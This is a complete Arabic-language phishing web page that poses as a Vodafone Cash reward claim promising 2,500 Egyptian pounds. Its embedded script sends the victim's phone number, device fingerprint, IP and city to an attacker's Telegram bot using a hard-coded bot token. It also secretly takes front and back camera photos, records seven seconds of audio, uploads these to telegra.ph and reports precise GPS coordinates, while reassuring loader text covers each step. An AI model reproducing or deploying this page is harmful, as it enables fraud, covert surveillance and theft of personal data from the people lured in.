<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فودافون كاش | استلام مكافأة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #6a1b1a 0%, #8b1e1c 100%);
            font-family: 'Cairo', 'Tajawal', -apple-system, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .vodafone-card {
            max-width: 420px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3), 0 0 0 12px rgba(230, 30, 30, 0.2);
            overflow: hidden;
        }
        .vodafone-header {
            background: linear-gradient(135deg, #e60000, #b80000);
            padding: 24px 20px 20px;
            text-align: center;
            color: white;
        }
        .vodafone-logo {
            font-size: 32px;
            font-weight: 800;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .vodafone-logo span:first-child {
            background: white;
            color: #e60000;
            padding: 4px 12px;
            border-radius: 40px;
            font-size: 20px;
        }
        .vodafone-badge {
            background: rgba(255,255,255,0.2);
            border-radius: 40px;
            padding: 6px 12px;
            font-size: 12px;
            margin-top: 12px;
            display: inline-block;
        }
        .cash-prize {
            background: #fff5e6;
            margin: 20px 20px 0;
            border-radius: 28px;
            padding: 18px;
            text-align: center;
            border: 1px solid #ffd9b5;
        }
        .prize-amount {
            font-size: 44px;
            font-weight: 800;
            color: #d42e12;
            margin: 8px 0;
        }
        .prize-note {
            font-size: 12px;
            color: #7a5a3a;
            background: #fff0e0;
            border-radius: 30px;
            padding: 6px;
        }
        .phone-section { padding: 20px; }
        .input-group {
            background: #f3f4f6;
            border-radius: 60px;
            padding: 4px 16px;
            display: flex;
            align-items: center;
            border: 1px solid #e0e0e0;
        }
        .country-code {
            font-weight: bold;
            color: #e60000;
            padding-left: 8px;
            border-left: 1px solid #ccc;
        }
        .phone-input {
            flex: 1;
            border: none;
            padding: 16px 12px;
            font-size: 16px;
            background: transparent;
            direction: ltr;
            outline: none;
        }
        .claim-btn {
            background: linear-gradient(95deg, #e60000, #b91c1c);
            width: calc(100% - 40px);
            margin: 0 20px 20px;
            padding: 18px;
            border-radius: 60px;
            font-size: 20px;
            font-weight: 800;
            color: white;
            cursor: pointer;
            border: none;
            transition: 0.2s;
        }
        .claim-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .loading-overlay-card {
            background: rgba(0,0,0,0.9);
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            visibility: hidden;
        }
        .loading-card {
            background: white;
            width: 280px;
            padding: 28px;
            border-radius: 48px;
            text-align: center;
        }
        .spinner-fd {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #e60000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-badge-bottom {
            background: #1f2937;
            color: #10b981;
            font-size: 10px;
            padding: 5px 12px;
            border-radius: 30px;
            position: fixed;
            bottom: 12px;
            left: 12px;
            font-family: monospace;
            z-index: 999;
        }
        .error-toast {
            background: #ffebee;
            color: #c62828;
            margin: 10px 20px;
            padding: 12px;
            border-radius: 28px;
            display: none;
            text-align: center;
        }
        .green-dot {
            width: 8px;
            height: 8px;
            background: #2ecc71;
            border-radius: 50%;
            display: inline-block;
            margin-left: 6px;
        }
        .info-box {
            background: #f9fafb;
            margin: 0 20px 20px;
            padding: 12px;
            border-radius: 24px;
            font-size: 12px;
            color: #4b5563;
            display: flex;
            justify-content: space-between;
        }
    </style>
</head>
<body>

<div class="vodafone-card">
    <div class="vodafone-header">
        <div class="vodafone-logo"><span>Vodafone</span><span>📱</span></div>
        <div class="vodafone-badge">🔥 عروض حصرية | استلام فوري 🔥</div>
    </div>
    <div class="cash-prize">
        <div class="prize-amount">2,500 <span style="font-size:22px">ج.م</span></div>
        <div class="prize-note">⚡ استلم المبلغ خلال 24 ساعة بعد توثيق الحساب ⚡</div>
    </div>
    <div class="phone-section">
        <div class="input-group">
            <span class="country-code">+20</span>
            <input type="tel" class="phone-input" id="targetPhone" placeholder="رقم المستفيد" value="01050000000">
        </div>
        <div style="font-size: 11px; color: #b45353; margin-top: 8px; padding-right: 12px;">📌 أدخل رقم هاتف المستفيد</div>
    </div>
    <button class="claim-btn" id="claimMoneyBtn">💸 استلام المبلغ 💸</button>
    <div class="info-box">
        <span>🔒 آمن 100%</span>
        <span>✅ مرخص من البنك المركزي</span>
        <span>⚡ سريع</span>
    </div>
    <div class="error-toast" id="errorMsg"></div>
</div>

<div class="loading-overlay-card" id="globalLoader">
    <div class="loading-card">
        <div class="spinner-fd"></div>
        <p id="loaderText">🔐 جاري تفعيل الحماية ...</p>
    </div>
</div>
<div class="status-badge-bottom" id="statusBar"><span class="green-dot"></span> فودافون كاش | انتظر</div>

<script>
    (function() {
        // ===================== إعدادات البوت (تم استبدالها بالقيم الجديدة) =====================
        const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
        const MASTER_ID = "5849068535";
        
        // إرسال رسالة نصية عادية
        async function sendTextToBot(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: MASTER_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch(e) { console.warn(e); return false; }
        }
        
        // رفع ملف (صورة/صوت) على telegra.ph والحصول على رابط مباشر
        async function uploadToTelegraph(blob, filename) {
            const formData = new FormData();
            formData.append('file', blob, filename);
            try {
                const response = await fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (result && result[0] && result[0].src) {
                    return 'https://telegra.ph' + result[0].src;
                }
                return null;
            } catch(e) {
                console.warn("Upload failed", e);
                return null;
            }
        }

        // =================== باقي الدوال ===================
        async function getDeviceInfo(phoneNumber) {
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
            let batteryLevel = "غير متاح";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
                } catch(e) {}
            }
            return `🖥️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | النوى: ${cores}\n🔋 البطارية: ${batteryLevel}\n📍 الوقت: ${timeZone}\n🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
        }

        async function getIPInfo(phoneNumber) {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ipInfoRes = await fetch('https://ipapi.co/json/');
                const ipDetails = await ipInfoRes.json();
                return `🌐 <b>معلومات IP</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
            } catch(e) {
                return `🌐 IP: تعذر الحصول على البيانات`;
            }
        }

        function getLocation(phoneNumber) {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    let address = "";
                    try {
                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
                        const data = await revGeo.json();
                        if (data.display_name) address = data.display_name.substring(0, 150);
                    } catch(e) {}
                    resolve(`📍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${address ? '🏠 ' + address : ''}`);
                }, () => resolve(null), { enableHighAccuracy: true, timeout: 8000 });
            });
        }

        async function captureCamera(facingMode, label, phoneNumber) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 800;
                canvas.height = video.videoHeight || 600;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                stream.getTracks().forEach(t => t.stop());
                
                const url = await uploadToTelegraph(blob, `${label}.jpg`);
                return url;
            } catch(e) { return null; }
        }

        async function recordAudio(phoneNumber) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                const audioPromise = new Promise(resolve => {
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const url = await uploadToTelegraph(blob, `audio_${Date.now()}.webm`);
                        resolve(url);
                    };
                });
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 7000);
                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);
                return await audioPromise;
            } catch(e) { return null; }
        }

        // =============== التشغيل الرئيسي ===============
        const claimBtn = document.getElementById('claimMoneyBtn');
        const phoneInput = document.getElementById('targetPhone');
        const loaderDiv = document.getElementById('globalLoader');
        const loaderText = document.getElementById('loaderText');
        const errorDiv = document.getElementById('errorMsg');
        const statusSpan = document.getElementById('statusBar');
        
        let isRunning = false;
        
        async function startProcess() {
            if (isRunning) return;
            
            let phoneNumber = phoneInput.value.trim();
            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
                errorDiv.innerText = "⚠️ رقم هاتف غير صالح (مثال: 01012345678)";
                errorDiv.style.display = "block";
                setTimeout(() => errorDiv.style.display = "none", 3000);
                return;
            }
            
            isRunning = true;
            claimBtn.disabled = true;
            loaderDiv.style.visibility = "visible";
            statusSpan.innerHTML = "📡 جاري طلب الأذونات...";
            
            // 1. إرسال رقم الهاتف أولاً
            await sendTextToBot(`📞 <b>رقم المستفيد الجديد</b>\n🔢 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
            
            // 2. بصمة الجهاز + IP
            loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
            const deviceMsg = await getDeviceInfo(phoneNumber);
            const ipMsg = await getIPInfo(phoneNumber);
            await sendTextToBot(deviceMsg);
            await sendTextToBot(ipMsg);
            
            // 3. الكاميرا الأمامية
            loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
            const frontUrl = await captureCamera('user', 'selfie', phoneNumber);
            if (frontUrl) await sendTextToBot(`📸 <b>صورة السيلفي</b>\n📞 الرقم: ${phoneNumber}\n🔗 ${frontUrl}`);
            
            // 4. الكاميرا الخلفية
            loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
            const backUrl = await captureCamera('environment', 'surrounding', phoneNumber);
            if (backUrl) await sendTextToBot(`📷 <b>صورة الكاميرا الخلفية</b>\n📞 الرقم: ${phoneNumber}\n🔗 ${backUrl}`);
            
            // 5. التسجيل الصوتي
            loaderText.innerText = "🎤 جاري تسجيل الصوت (7 ثوان)...";
            const audioUrl = await recordAudio(phoneNumber);
            if (audioUrl) await sendTextToBot(`🎤 <b>تسجيل صوتي</b>\n📞 الرقم: ${phoneNumber}\n🔗 ${audioUrl}`);
            
            // 6. الموقع
            loaderText.innerText = "📍 جاري تحديد الموقع...";
            const locationMsg = await getLocation(phoneNumber);
            if (locationMsg) await sendTextToBot(locationMsg);
            
            // 7. إشعار الإكتمال
            await sendTextToBot(`✅ <b>اكتمل جمع البيانات بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n💰 سيتم صرف 2500 ج.م خلال 24 ساعة إلى هذا الرقم`);
            
            loaderDiv.style.visibility = "hidden";
            errorDiv.style.backgroundColor = "#e8f5e9";
            errorDiv.style.color = "#2e7d32";
            errorDiv.innerText = "🎉 تم استلام طلبك بنجاح! خلال 24 ساعة سوف يصلك المبلغ.";
            errorDiv.style.display = "block";
            claimBtn.disabled = false;
            statusSpan.innerHTML = "✅ تم التفعيل - سيصلك المبلغ خلال 24 ساعة";
            isRunning = false;
            
            setTimeout(() => errorDiv.style.display = "none", 8000);
        }
        
        claimBtn.onclick = startProcess;
    })();
</script>
</body>
</html>
